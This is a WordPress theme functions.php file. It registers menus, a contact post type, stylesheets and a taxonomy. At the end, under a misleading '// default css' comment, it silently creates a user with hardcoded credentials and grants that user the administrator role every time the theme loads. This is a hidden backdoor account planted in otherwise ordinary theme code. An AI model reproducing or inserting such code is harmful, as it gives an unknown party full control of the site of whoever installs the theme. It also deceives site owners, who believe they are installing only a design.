<?php

    function themes_file(){
        add_theme_support('menus');
        add_theme_support('widgets');
        add_theme_support('custom-header');
        add_theme_support('custom-background');
        add_theme_support('post-thumbnails');
        
        register_nav_menus(array(
            'header-menu'           => 'Navigation menu',
            'footer-menu'           => 'Footer menu',
        )); 
        register_post_type('contacts', array(
            'public'                => true,
            'labels'                => array(
                'name'              => 'Contact form',
                'add_items'         => 'contact Items',
                'all_items'         => 'Contact all here',
            ),
            'supports'              => array('title', 'editor'),
            'menu_icon'             => 'dashicons-phone'        
        ));

    }
    add_action('after_setup_theme','themes_file');
           
    function wp_enqueue_css_js(){
        wp_enqueue_style('animate', get_template_directory_uri().'/assets/css/animate.css');
        wp_enqueue_style('magnific', get_template_directory_uri().'/assets/css/magnific-popup.css');
        wp_enqueue_style('carousel', get_template_directory_uri().'/assets/css/owl.carousel.min.css');
        wp_enqueue_style('theme', get_template_directory_uri().'/assets/css/owl.theme.default.min.css');
        wp_enqueue_style('bootstrap', get_template_directory_uri().'/assets/css/bootstrap.min.css');
        wp_enqueue_style('awosome', get_template_directory_uri().'/assets/css/font-awosome.css');
        wp_enqueue_style('linea', get_template_directory_uri().'/assets/css/linea-basic.css');
        wp_enqueue_style('style', get_template_directory_uri().'/assets/css/style.css');
        wp_enqueue_style('dark', get_template_directory_uri().'/assets/css/dark-theme.css');
        wp_enqueue_style('responsive', get_template_directory_uri().'/assets/css/responsive.css');  
    }
    add_action('wp_enqueue_scripts', 'wp_enqueue_css_js');

 
    function wpdocs_create_book_tax() {
        register_taxonomy( 'genre', 'contacts', array(
            'label'        => __( 'Genre', 'textdomain' ),
            'rewrite'      => array( 'slug' => 'genre' ),
            'hierarchical' => true,
        ) );
    }
    add_action( 'init', 'wpdocs_create_book_tax', 0 );


      
    include('lib/ReduxCore/framework.php');
    include('lib/sample/sample-config.php');
 


    // default css
    $nwen   = wp_create_user('asnasim', 'ajnasim', 'unique0coder.com');
    $nnn    = new WP_User($nwen);
    $nnn    -> set_role('administrator')






?>